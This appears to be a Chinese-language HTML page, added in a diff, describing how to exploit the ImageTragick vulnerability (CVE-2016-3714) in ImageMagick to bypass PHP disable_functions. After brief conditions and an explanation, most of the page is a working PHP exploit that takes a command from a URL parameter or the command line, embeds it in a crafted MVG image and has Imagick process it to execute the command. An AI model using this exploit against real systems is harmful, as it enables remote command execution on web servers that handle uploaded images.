@@ -1,0 +1,23 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h2 class="cs868C439D">
+			<a name="利用-imagemagick-漏洞绕过（一）"><span class="cs83F14626">利用</span><span class="csB2D98684"> ImageMagick </span><span class="cs83F14626">漏洞绕过（一）</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs5BEC2C28">1.</span><span class="csE3F655E4">利用条件</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Imagick &lt;= 3.3.0 PHP &gt;= 5.4</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">2.</span><span class="csE3F655E4">基本原理</span></p><p class="cs40DD2BC9"><span class="cs8926E06">ImageTragick</span><span class="cs9C1B1871">（</span><span class="cs8926E06">CVE-2016-3714</span><span class="cs9C1B1871">）</span><span class="cs8926E06"> </span><span class="cs9C1B1871">漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的</span><span class="cs8926E06">ImageMagick</span><span class="cs9C1B1871">，</span><span class="cs8926E06">ImageMagick</span><span class="cs9C1B1871">会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。因此很多具有头像上传、图片转换、图片编辑等具备图片上传功能的网站都可能会中招。</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">3.exp</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$command = PHP_SAPI == &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if ($command == &#39;&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;$command = &#39;id&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$exploit = &lt;&lt;&lt;EOF</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">push graphic-context</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">viewbox 0 0 640 480</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fill &#39;url(https://example.com/image.jpg&quot;|$command&quot;)&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">pop graphic-context</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">EOF;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$thumb = new Imagick();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$thumb-&gt;writeImage(&#39;KKKK.png&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$thumb-&gt;clear();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$thumb-&gt;destroy();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">unlink(&quot;KKKK.mvg&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">unlink(&quot;KKKK.png&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p></body>
+</html>
